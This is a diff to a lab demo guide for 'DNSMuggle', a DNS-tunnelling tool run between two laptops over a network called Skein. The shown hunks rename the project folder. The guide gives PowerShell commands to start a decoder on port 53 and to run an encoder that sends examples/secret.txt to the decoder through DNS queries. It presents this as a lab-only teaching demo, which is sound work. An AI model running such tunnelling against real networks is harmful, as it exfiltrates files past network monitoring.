@@ -1,4 +1,4 @@
-# Demo script — DNS tunnelling over Skein
+# DNSMuggle demo — DNS tunnelling over Skein
 
 Lab-only demo, on your own laptops, with your own test files.
 Written 2026-11-12 from the 2026-11-11 run, when the decoder was
@@ -53,7 +53,7 @@ the DNS test cannot work until Laptop B has joined.
 ## Step 1: Laptop A — start the decoder
 
 In PowerShell **as Administrator** (port 53 needs admin rights),
-in the `DNS-TUNELLING` folder:
+in the `DNSMuggle` folder:
 
 ```powershell
 python decoder.py --host <SKEIN_DECODER_IP> --port 53
@@ -63,7 +63,7 @@ Windows notes, from the 2026-11-11 run:
 
 - Use `python`, not `python3` — on Windows `python3` is not
   recognised.
-- `cd` into the `DNS-TUNELLING` folder first; running from
+- `cd` into the `DNSMuggle` folder first; running from
   `C:\Users\bohra>` fails because `decoder.py` is not there.
 - If port 53 is a problem, use port 5353 instead (no admin needed)
   and match it on the encoder side with `--port 5353`.
@@ -73,7 +73,7 @@ is done.
 
 ## Step 2: Laptop B — send the file
 
-On Laptop B, in the same `DNS-TUNELLING` folder:
+On Laptop B, in the same `DNSMuggle` folder:
 
 ```powershell
 python encoder.py examples/secret.txt --server <SKEIN_DECODER_IP> --port 53 --delay 0.05
